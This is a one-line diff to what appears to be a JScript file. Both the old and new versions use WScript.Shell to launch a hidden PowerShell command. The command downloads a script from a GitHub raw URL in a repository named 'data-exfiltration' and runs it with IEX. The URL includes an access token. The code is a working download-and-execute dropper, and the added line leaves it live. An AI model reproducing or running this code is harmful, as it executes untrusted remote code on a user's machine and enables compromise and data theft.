@@ -1,1 +1,1 @@
-a=new ActiveXObject('Wscript.Shell');a.Run("powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/eternal-red/data-exfiltration/main/test.txt?token=GHSAT0AAAAAABQJMOSMCN3UGD44OCMHIWYOYPZN6LQ');",1,true);
+var a=new ActiveXObject('Wscript.Shell');a.Run("powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/eternal-red/data-exfiltration/main/test.txt?token=GHSAT0AAAAAABQJMOSMCN3UGD44OCMHIWYOYPZN6LQ');",1,true);
